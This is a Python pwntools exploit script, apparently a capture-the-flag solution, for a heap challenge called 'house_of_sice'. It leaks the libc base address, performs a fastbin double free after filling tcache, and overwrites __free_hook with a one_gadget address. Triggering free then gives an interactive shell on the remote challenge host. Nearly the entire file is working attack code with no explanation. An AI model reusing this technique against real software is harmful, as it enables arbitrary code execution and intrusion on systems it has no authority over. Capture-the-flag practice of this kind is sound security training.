#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./house_of_sice')
libc = ELF('./libc-2.31.so')

host = args.HOST or 'house-of-sice.hsc.tf'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
source ~/gdb.plugins/gef/gef.py
continue
'''.format(**locals())

#===========================================================

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

io = start()

io.recvuntil('deet: ', drop=True)
libc.address = int(io.recvuntil('\n', drop=True),16) - libc.symbols['system']
print('libc base = {:#x}'.format(libc.address))

onegadgets = one_gadget('libc.so.6', libc.address)

def addm(val):
  io.sendlineafter('> ', '1')
  io.sendlineafter('> ', '1')
  io.sendlineafter('> ', str(val))

def addc(val):
  io.sendlineafter('> ', '1')
  io.sendlineafter('> ', '2')
  io.sendlineafter('> ', str(val))

def free(idx):
  io.sendlineafter('> ', '2')
  io.sendlineafter('> ', str(idx))

for i in range(7):
 addm(0x41+i)

addm(0x48)
addm(0x49)
addm(0x4a)

for i in range(7): 
 free(i)

free(8)
free(9)
free(8)

addm(0x50)
addm(0x50)

addc(libc.symbols['__free_hook'])
addm(0x51)
addm(onegadgets[1])

pause()
free(0)

io.interactive()

